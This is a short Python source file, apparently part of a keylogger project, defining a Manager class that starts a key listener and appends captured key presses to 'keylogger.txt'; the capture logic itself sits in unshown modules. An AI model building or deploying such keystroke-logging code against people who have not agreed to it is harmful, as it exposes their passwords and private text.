from events import MyListener
from files import MyFile
import date_and_time


class Manager:
    def __init__(self):
        self.key_listener = MyListener()
        self.file = MyFile("keylogger.txt")
        self.dic = {}

    def start(self):
        self.key_listener.start_run_and_listener()

    def append_dic(self):
        self.file.create_or_check_file()
        self.file.write_to_file(self.key_listener.catch_key_press())



    def stop(self):
        self.key_listener.stop_program()
